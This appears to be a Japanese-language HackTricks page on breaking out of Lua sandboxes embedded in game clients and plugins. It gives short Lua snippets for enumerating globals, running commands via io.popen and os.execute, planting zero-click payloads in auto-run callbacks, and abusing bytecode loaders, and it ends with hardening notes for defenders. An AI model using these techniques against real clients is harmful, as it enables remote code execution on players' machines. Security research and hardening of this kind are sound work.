# Lua sandbox（embedded VM、game client）をBypassする

{{#include ../../../banners/hacktricks-training.md}}

このページでは、アプリケーション（特に game client、plugin、またはアプリ内の scripting engine）に組み込まれた Lua「sandbox」をenumerateし、break outするための実践的なtechniqueをまとめています。多くのengineは制限されたLua環境を公開しますが、強力なglobalへ到達できる状態を残しているため、arbitrary command executionや、bytecode loaderが公開されている場合にはnative memory corruptionさえ可能になります。

主なポイント:
- VMを未知の環境として扱う: _Gをenumerateし、到達可能な危険なprimitiveを見つける。
- stdout/printがblockされている場合は、VM内のUI/IPC channelをoutput sinkとして悪用し、結果を確認する。
- io/osがexposeされている場合、直接command executionが可能なことが多い（io.popen、os.execute）。
- load/loadstring/loadfileがexposeされている場合、crafted Lua bytecodeを実行して、一部のversionでmemory safetyをsubvertできる（≤5.1ではverifierをbypass可能、5.2ではverifierが削除済み）。これによりadvanced exploitationが可能になる。

## sandbox環境をEnumerateする

- global environmentをdumpして、到達可能なtable/functionをinventoryする:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- `print()` が利用できない場合は、VM 内の channel を転用します。MMO の housing script VM では、sound call の後でのみ chat output が機能します。以下では、信頼性の高い output function を構築しています：<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
このパターンを対象に合わせて一般化してください。文字列を受け付ける textbox、toast、logger、UI callback は、いずれも reconnaissance の stdout として機能します。

## io/os が公開されている場合の直接的なコマンド実行

sandbox が標準ライブラリの io または os を引き続き公開している場合、すぐにコマンド実行できる可能性があります。
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notes:

- 実行は client process 内で発生するため、外部 debugger をブロックする多くの anti-cheat/antidebug レイヤーでも、in-VM process creation は阻止できません。
- 次も確認してください: package.loadlib（任意の DLL/.so loading）、native modules を使用する require、LuaJIT の ffi（存在する場合）、および debug library（VM 内で privileges を引き上げられる可能性があります）。

## auto-run callbacks 経由の Zero-click triggers

host application が clients に scripts をプッシュし、VM が auto-run hooks（例: OnInit/OnLoad/OnEnter）を公開している場合、script の load 直後に drive-by compromise を実行できるよう、そこに payload を配置します:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
スクリプトがクライアント上で自動的に送信・実行される場合、同等の callback（OnLoad、OnEnter など）によってこの technique を一般化できます。

## recon 中に探すべき危険な primitive

_G の列挙時には、特に以下を探します。
- io、os: io.popen、os.execute、file I/O、環境へのアクセス。
- load、loadstring、loadfile、dofile: source または bytecode を実行する。信頼できない bytecode の読み込みをサポートする。
- package、package.loadlib、require: dynamic library の読み込みと module surface。
- debug: setfenv/getfenv（≤5.1）、getupvalue/setupvalue、getinfo、hooks。
- LuaJIT-only: ffi.cdef、ffi.load により native code を直接呼び出す。

到達可能な場合の最小使用例：
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optional escalation: Lua bytecode loaders の悪用

load/loadstring/loadfile に到達可能だが io/os が制限されている場合、細工した Lua bytecode の実行により、memory disclosure および corruption primitives につながる可能性があります。主な事実:
- Lua ≤ 5.1 には bytecode verifier が同梱されていましたが、既知の bypasses があります。<sup>[[4]](#references)</sup>
- Lua 5.2 では verifier が完全に削除されました（公式見解: アプリケーション側で precompiled chunks を拒否すべき）。そのため、bytecode loading が禁止されていない場合は attack surface が広がります。<sup>[[2]](#references)[[3]](#references)</sup>
- 一般的なワークフロー: in-VM output 経由で pointers を leak し、type confusions を引き起こす bytecode（FORLOOP やその他の opcodes 周辺など）を作成し、その後 arbitrary read/write または native code execution へ pivot します。<sup>[[2]](#references)[[4]](#references)</sup>

この経路は engine/version-specific であり、RE が必要です。詳細な分析、exploit primitives、ゲームにおける gadgetry の例については references を参照してください。

## Detection and hardening notes (for defenders)

- Server side: user scripts を reject または rewrite し、安全な APIs を allowlist し、io、os、load/loadstring/loadfile/dofile、package.loadlib、debug、ffi を strip または bind-empty する。
- Client side: 最小限の _ENV で Lua を実行し、bytecode loading を禁止し、strict な bytecode verifier または signature checks を再導入して、client process からの process creation を block する。
- Telemetry: script load の直後に発生する gameclient → child process creation を alert し、UI/chat/script events と correlate する。

## References

- [1] [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
